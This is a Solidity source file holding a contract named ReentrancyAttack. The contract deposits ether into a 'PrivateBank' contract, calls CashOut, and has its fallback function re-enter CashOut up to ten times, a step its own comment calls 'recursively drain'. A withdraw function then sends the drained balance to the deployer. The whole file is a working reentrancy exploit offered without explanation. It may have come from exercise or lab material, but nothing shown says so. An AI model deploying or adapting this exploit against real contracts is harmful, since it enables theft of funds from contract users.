pragma solidity ^0.4.19;

interface IPrivateBank {
    function Deposit() external payable;
    function CashOut(uint _am) external;
}

contract ReentrancyAttack {
    IPrivateBank public target;
    address public owner;
    uint public attackCount;
    bool public attacking;

    constructor(address _target) public {
        target = IPrivateBank(_target);
        owner = msg.sender;
    }

    // Attack starts here
    function initiateAttack() external payable {
        require(msg.value >= 1 ether); // meets MinDeposit
        target.Deposit.value(msg.value)(); // deposit
        attacking = true;
        target.CashOut(msg.value); // trigger first withdrawal
    }

    function() public payable {
        if (attacking && attackCount < 10) {
            attackCount++;
            target.CashOut(msg.value); // recursively drain
        }
    }

    function withdraw() public {
        require(msg.sender == owner);
        owner.transfer(address(this).balance);
    }
}

